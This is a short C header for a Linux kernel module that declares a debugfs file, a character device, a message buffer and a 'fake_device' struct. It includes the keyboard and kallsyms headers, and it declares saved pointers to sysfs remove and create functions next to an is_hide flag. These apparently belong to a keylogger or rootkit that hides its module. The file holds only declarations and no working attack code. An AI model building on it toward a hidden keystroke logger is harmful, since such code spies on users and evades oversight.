#ifndef _FOPS_H_
#define _FOPS_H_
#include <linux/fs.h>
#include <linux/input.h>
#include <linux/err.h>
#include <linux/keyboard.h>
#include <linux/module.h>
#include <linux/debugfs.h>
#include <linux/kallsyms.h>
#include <linux/kernfs.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/kernel.h>
#include <linux/mutex.h>
#include <linux/err.h>
#include <linux/cdev.h>
#include <linux/semaphore.h>
#include <linux/sysfs.h>
#define BUFF_SIZE (PAGE_SIZE << 2)
static struct dentry* file;
static struct dentry* subdir;
static char msg_Ptr[BUFF_SIZE];
static size_t buf_pos;

void (*sysfs_remove_fir_orig)(struct kobject*);
void (*sysfs_create_fir_orig)(struct kobject*);
int is_hide = 0;
int ret;
struct cdev* mcdev;
int major_number;
dev_t dev_num;

struct fake_device
{
    char data[100];
    struct semaphore sem;

};
#endif